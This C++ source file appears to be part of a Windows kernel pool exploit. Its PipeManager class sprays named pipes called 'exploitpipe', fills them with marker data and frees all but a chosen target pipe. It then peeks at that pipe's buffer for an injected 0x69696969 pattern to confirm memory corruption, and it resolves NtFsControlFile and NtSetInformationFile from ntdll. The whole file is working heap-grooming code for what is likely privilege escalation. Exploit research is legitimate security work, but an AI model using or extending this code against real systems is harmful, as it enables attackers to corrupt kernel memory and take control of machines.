#include "pipeManager.h"
#include "config.h"

#ifndef PIPE_END_BUFFER_MULTIPLIER
#define PIPE_END_BUFFER_MULTIPLIER 2
#endif


PipeManager::PipeManager(UINT64 iChunkSize)
{
    // Validate incoming chunk size
    if (iChunkSize <= 0x40) {
        DEBUG_PRINT("[!] Invalid chunk size passed to PipeManager\n");
        pipeSize = 0;
    }
    else {
        pipeSize = iChunkSize - 0x40;
    }

    corruptedPipe = NULL;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        DEBUG_PRINT("[!] Failed to get ntdll module\n");
        _NtFsControlFile = NULL;
        _NtSetInformationFile = NULL;
        return;
    }

    _NtFsControlFile = (pNtFsControlFile)GetProcAddress(ntdll, "NtFsControlFile");
    _NtSetInformationFile = (pNtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

    if (!_NtFsControlFile || !_NtSetInformationFile) {
        DEBUG_PRINT("[!] Failed to resolve NtFsControlFile or NtSetInformationFile\n");
    }
}


void PipeManager::CreatePipes(UINT64 iPipeCount)
{

    if (sPipes.size() > 0)
        ClearPipes();

    if (pipeSize == 0) {
        DEBUG_PRINT("[!] CreatePipes called with pipeSize=0\n");
        return;
    }

    // Keep pipe buffers modest to reduce pool pressure while remaining effective
    DWORD perEndBuf = (DWORD)(pipeSize * PIPE_END_BUFFER_MULTIPLIER);
    if (perEndBuf < pipeSize) perEndBuf = (DWORD)pipeSize;

    sPipes.reserve((size_t)iPipeCount);
    cPipes.reserve((size_t)iPipeCount);

    BYTE* payload = new BYTE[pipeSize]; // freed at end of function
    char marker[5] = { "PIPE" };

    DWORD bytesWritten;
    for (UINT32 i = 0; i < iPipeCount; i++)
    {
        char pipeName[64];
        sprintf_s(pipeName, sizeof(pipeName), "\\\\.\\pipe\\exploitpipe%llu", i);
        HANDLE s = CreateNamedPipeA(
            pipeName,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            1,
            perEndBuf,
            perEndBuf,
            0,
            NULL);
        if (s == INVALID_HANDLE_VALUE || s == NULL) {
            DEBUG_PRINT("[!] CreateNamedPipeA failed for %s (err=%lu)\n", pipeName, GetLastError());
            continue;
        }
        HANDLE c = CreateFileA(pipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (c == INVALID_HANDLE_VALUE || c == NULL) {
            DEBUG_PRINT("[!] CreateFileA pipe client failed for %s (err=%lu)\n", pipeName, GetLastError());
            DisconnectNamedPipe(s);
            CloseHandle(s);
            continue;
        }

        memcpy(payload, marker, 0x4);
        memcpy(payload + 0x4, &i, 0x4);
        memset(payload + 0x8, 0x39, pipeSize - 0x8);

        if (!WriteFile(c, payload, pipeSize, &bytesWritten, NULL)) {
            DEBUG_PRINT("[!] Initial WriteFile to pipe failed (err=%lu)\n", GetLastError());
        }

        sPipes.push_back(s);
        cPipes.push_back(c);

        if ((i & 15) == 15) {
            Sleep(0);
        }
    }

    delete[] payload;
}


void PipeManager::ClearExtraPipes(UINT64 targetIndex)
{
    if (targetIndex >= sPipes.size()) {
        DEBUG_PRINT("[!] targetIndex out of range for ClearExtraPipes\n");
        return;
    }

    corruptedPipe = sPipes[(size_t)targetIndex];
    DEBUG_PRINT("\n [*] Target Pipe: %llu\n", (unsigned long long)targetIndex);

    for (size_t i = 0; i < sPipes.size(); i++)
    {
        if (i == (size_t)targetIndex) continue;

        HANDLE s = sPipes[i];
        if (s != NULL && s != INVALID_HANDLE_VALUE) {
            DisconnectNamedPipe(s); // attempt to disconnect client
            CloseHandle(s);
            sPipes[i] = INVALID_HANDLE_VALUE;
        }

        if (i < cPipes.size()) {
            HANDLE c = cPipes[i];
            if (c != NULL && c != INVALID_HANDLE_VALUE) {
                CloseHandle(c);
                cPipes[i] = INVALID_HANDLE_VALUE;
            }
        }
    }
}


bool PipeManager::VerifyCorruption()
{
    if (corruptedPipe == NULL || corruptedPipe == INVALID_HANDLE_VALUE) return false;

    UINT32 expectedSize = 0;
    if (pipeSize > 0 && pipeSize > 0x20) expectedSize = (UINT32)(pipeSize * PIPE_END_BUFFER_MULTIPLIER - 0x50);
    if (expectedSize == 0) return false;

    size_t bufSz = (size_t)expectedSize * 20;
    std::vector<BYTE> buffer(bufSz);
    std::fill(buffer.begin(), buffer.end(), 0);

    DWORD bytesAvailable = 0;
    BOOL status = PeekNamedPipe(corruptedPipe, buffer.data(), expectedSize, NULL, &bytesAvailable, NULL);
    if (!status) return false;

    size_t scanLen = std::min<size_t>(bufSz, (size_t)bytesAvailable);
    // Scan byte-by-byte to handle potential unaligned pattern placement
    for (size_t byteIndex = 0; byteIndex + 4 <= scanLen; ++byteIndex)
    {
        if (*(UINT32*)(&buffer[byteIndex]) == 0x69696969)
        {
            DEBUG_PRINT("\n [*] SUCCESS: Corrupted pipe found\n\n");
            return true;
        }
    }
    return false;
}




void PipeManager::ClearPipes()
{
    // close server handles
    for (size_t i = 0; i < sPipes.size(); ++i)
    {
        HANDLE s = sPipes[i];
        if (s != NULL && s != INVALID_HANDLE_VALUE) {
            DisconnectNamedPipe(s);
            CloseHandle(s);
            sPipes[i] = INVALID_HANDLE_VALUE;
        }
    }

    // close client handles
    for (size_t i = 0; i < cPipes.size(); ++i)
    {
        HANDLE c = cPipes[i];
        if (c != NULL && c != INVALID_HANDLE_VALUE) {
            CloseHandle(c);
            cPipes[i] = INVALID_HANDLE_VALUE;
        }
    }

    sPipes.clear();
    cPipes.clear();
}
